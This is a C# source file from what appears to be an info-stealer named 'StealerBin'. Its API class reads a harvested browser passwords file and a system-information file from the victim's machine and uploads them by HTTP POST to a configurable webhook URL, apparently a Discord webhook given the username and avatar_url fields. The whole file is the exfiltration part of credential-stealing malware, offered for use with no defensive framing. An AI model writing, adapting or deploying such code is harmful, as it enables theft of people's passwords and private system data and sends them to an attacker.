using System;
using System.IO;
using System.Net;
using System.Net.Http;

namespace StealerBin
{
	internal class API
	{
		public string _name { get; set; }

		public string _ppUrl { get; set; }

		public API(string _HookUrl)
		{
			this._Client = new HttpClient();
			this._URL = _HookUrl;
		}

		public static void Passwords()
		{
			try
			{
				string text = "C:/temp/" + Environment.UserName + "_Passwords.txt";
				try
				{
					bool flag = File.Exists(text);
					if (flag)
					{
						new API(API.Hook)
						{
							_name = API.name,
							_ppUrl = API.pfp
						}.SendPasswords("**Browser Password!**", text);
					}
				}
				catch (Exception)
				{
				}
			}
			catch
			{
				new API(API.Hook)
				{
					_name = API.name,
					_ppUrl = API.pfp
				}.SendPasswords("Passwords.txt not found :/", null);
			}
		}

		public bool SendPasswords(string content, string file = null)
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(this._name), "username");
			multipartFormDataContent.Add(new StringContent(this._ppUrl), "avatar_url");
			multipartFormDataContent.Add(new StringContent(content), "content");
			bool flag = file != null;
			if (flag)
			{
				byte[] content2 = File.ReadAllBytes(file);
				multipartFormDataContent.Add(new ByteArrayContent(content2), Environment.UserName + "_Passwords.txt", Environment.UserName + "_Passwords.txt");
			}
			HttpResponseMessage result = this._Client.PostAsync(this._URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}

		public bool SendSysInfo(string content, string file = null)
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(this._name), "username");
			multipartFormDataContent.Add(new StringContent(this._ppUrl), "avatar_url");
			multipartFormDataContent.Add(new StringContent(content), "content");
			bool flag = file != null;
			if (flag)
			{
				byte[] content2 = File.ReadAllBytes(file);
				multipartFormDataContent.Add(new ByteArrayContent(content2), "SystemINFO.txt", "SystemINFO.txt");
			}
			HttpResponseMessage result = this._Client.PostAsync(this._URL, multipartFormDataContent).Result;
			return result.StatusCode == HttpStatusCode.NoContent;
		}

		public static string Hook = "";

		public static string name = "";

		public static string pfp = "";

		private HttpClient _Client;

		private string _URL;
	}
}
